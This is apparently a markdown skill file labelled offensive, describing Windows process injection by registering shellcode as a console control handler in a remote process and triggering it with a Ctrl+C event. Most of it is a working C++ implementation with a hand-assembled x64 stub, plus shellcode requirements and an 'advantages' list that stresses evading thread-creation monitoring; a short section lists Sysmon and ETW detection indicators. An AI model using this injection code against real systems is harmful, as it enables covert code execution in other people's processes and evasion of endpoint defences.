---
name: ctrl-inject-handler
description: Ctrl+C / Ctrl+Break console handler injection -- SetConsoleCtrlHandler in a remote console process to execute shellcode when a console signal is dispatched.
metadata:
  type: offensive
---

# Ctrl Handler Injection

Inject code into a remote console process by registering a `ConsoleCtrlHandler` that points
to shellcode, then sending a console control signal to trigger it.

## Background

Console applications can register handlers for `CTRL_C_EVENT`, `CTRL_BREAK_EVENT`,
`CTRL_CLOSE_EVENT`, etc. via `SetConsoleCtrlHandler`. When a signal arrives, the system
creates a new thread in the target process that calls `CtrlRoutine` in `kernelbase.dll`,
which walks the registered handler list.

## Attack Chain

```
1. Identify a console process (cmd.exe, powershell.exe, python.exe, etc.)
2. OpenProcess(PROCESS_ALL_ACCESS)
3. VirtualAllocEx -- allocate RWX in target
4. WriteProcessMemory -- write shellcode
5. Find address of SetConsoleCtrlHandler in kernelbase.dll (same across processes)
6. CreateRemoteThread(SetConsoleCtrlHandler, shellcode_addr)
   -- this REGISTERS the shellcode as a handler (add=TRUE is param 2)
7. GenerateConsoleCtrlEvent(CTRL_C_EVENT, target_process_group_id)
   -- OR: the system dispatches Ctrl+C naturally
8. System creates a thread in the target → calls CtrlRoutine → calls your handler
```

### Simplified Implementation

```cpp
bool ctrl_inject(DWORD pid, const uint8_t* shellcode, size_t sc_len) {
    HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hp) return false;

    // Allocate and write shellcode
    LPVOID remote = VirtualAllocEx(hp, NULL, sc_len, MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, remote, shellcode, sc_len, NULL);

    // Register shellcode as a console ctrl handler
    // SetConsoleCtrlHandler(HandlerRoutine, TRUE)
    // HandlerRoutine = shellcode address, Add = TRUE (1)
    auto pSetHandler = (LPTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandleA("kernelbase.dll"), "SetConsoleCtrlHandler");

    // The trick: CreateRemoteThread with SetConsoleCtrlHandler as the thread func
    // and shellcode_addr as the parameter -- but this only works for the "Add" call.
    // A more reliable approach: write a small stub that calls SetConsoleCtrlHandler(sc, TRUE)
    
    // Stub approach:
    uint8_t stub[] = {
        0x48, 0xB9, 0,0,0,0,0,0,0,0,  // mov rcx, <shellcode_addr>
        0xBA, 0x01, 0x00, 0x00, 0x00,   // mov edx, 1 (TRUE = add handler)
        0x48, 0xB8, 0,0,0,0,0,0,0,0,   // mov rax, <SetConsoleCtrlHandler>
        0xFF, 0xD0,                      // call rax
        0xC3                             // ret
    };
    *(uint64_t*)(stub + 2) = (uint64_t)remote;
    *(uint64_t*)(stub + 17) = (uint64_t)pSetHandler;

    LPVOID stubRemote = VirtualAllocEx(hp, NULL, sizeof(stub),
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, stubRemote, stub, sizeof(stub), NULL);

    HANDLE ht = CreateRemoteThread(hp, NULL, 0, (LPTHREAD_START_ROUTINE)stubRemote, NULL, 0, NULL);
    WaitForSingleObject(ht, 5000);
    CloseHandle(ht);

    // Trigger the handler
    GenerateConsoleCtrlEvent(CTRL_C_EVENT, pid);

    CloseHandle(hp);
    return true;
}
```

## Shellcode Requirements

The shellcode must conform to the `HandlerRoutine` signature:

```cpp
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType) {
    // dwCtrlType: CTRL_C_EVENT (0), CTRL_BREAK_EVENT (1), etc.
    // Payload code here
    return TRUE;  // TRUE = handled, don't call other handlers
}
```

Return `TRUE` to prevent the default handler (which terminates the process) from running.

## Advantages

- **No `CreateRemoteThread` for execution**: the system creates the thread via the console
  subsystem, which may bypass some `CreateRemoteThread` monitoring
- **Legitimate API usage**: `SetConsoleCtrlHandler` is a normal API, not suspicious on its own
- **Signal-triggered**: execution timing can be controlled via `GenerateConsoleCtrlEvent`

## Limitations

- Target must be a **console process** attached to a console
- Target must be in the same console session (or you need `AttachConsole(pid)` first)
- `GenerateConsoleCtrlEvent` sends to a process group, not a single process -- may affect
  other processes in the group
- EDRs increasingly monitor `SetConsoleCtrlHandler` cross-process calls

## Detection

- Sysmon Event ID 8 (`CreateRemoteThread`) for the registration step
- Sysmon Event ID 10 (`ProcessAccess`) with `PROCESS_ALL_ACCESS` from untrusted process
- `RWX MEM_PRIVATE` allocation in a console process
- `GenerateConsoleCtrlEvent` from a process that isn't the console host
- ETW `Microsoft-Windows-Kernel-Process` thread creation in a console app with start address
  in `MEM_PRIVATE` region

## Related Skills

- `thread-hijacking-injection` -- alternative thread-based injection
- `apc-injection-detection` -- similar cross-process memory write pattern
- `windows-process-injection-memory` -- umbrella injection reference
